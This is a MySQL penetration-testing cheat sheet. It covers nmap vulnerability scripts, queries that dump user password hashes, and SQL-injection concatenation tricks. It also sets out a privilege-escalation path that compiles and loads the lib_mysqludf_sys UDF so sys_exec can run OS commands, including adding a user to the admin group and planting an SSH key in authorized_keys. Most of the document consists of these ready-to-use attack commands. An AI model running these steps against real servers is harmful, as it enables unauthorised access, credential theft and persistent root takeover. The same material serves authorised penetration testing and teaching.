#### nmap
`nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse <ip> -p 3306`

#### Interesting files
`~/.mysql_history`    
`mysqli_connect.php`

####Command line
+ **connect** `mysql -h <ip> -P <port> -u <user> -p <password>`
+ **list databases** `show databases;`
+ **select database** `use <database>`
+ **list tables** `show tables;`
+ **mysql users** `use mysql; select * from user;`
+ **current user grants** `show grants;`

#### Tricks

+ Get version, current user, current database, hostname, database files location
```SQL
select @@version
select user(); select system_user()
select database()
select @@hostname
select @@datadir
```
+ List users and hashes (requires privileges)
```SQL
select host, user, password from mysql.user
```
+ Querying for all values in a column in a single string
```SQL
select group_concat(name separator %27,%27) from users
select group_concat(cast(uid as char(50)) separator %27,%27) from users
```
+ Grant file access to a user
```SQL
GRANT FILE ON *.* TO '<user>'@'localhost'
```
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

####Executing system commands
http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/

Check if this file exists    
`/usr/lib/lib_mysqludf_sys.so`    
`whereis lib_mysqludf_sys.so`

+ If it does

```
mysql -u root -p
...
mysql> select sys_exec('<command>');
```

`sys_exec` returns the exit status and `sys_eval` returns the standard output

This will add a user to the admins group    
`mysql> select sys_exec('usermod -a -G admin <user>');`

+ If user has privileges, copy `lib_mysqludf_sys.so` file
Compile it using    
```
git clone https://github.com/mysqludf/lib_mysqludf_sys
gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o ./lib_mysqludf_sys.so
```

Use [mysql.sh](mysql.sh) to install `lib_mysql_udf` and add your key to `authorized_keys`
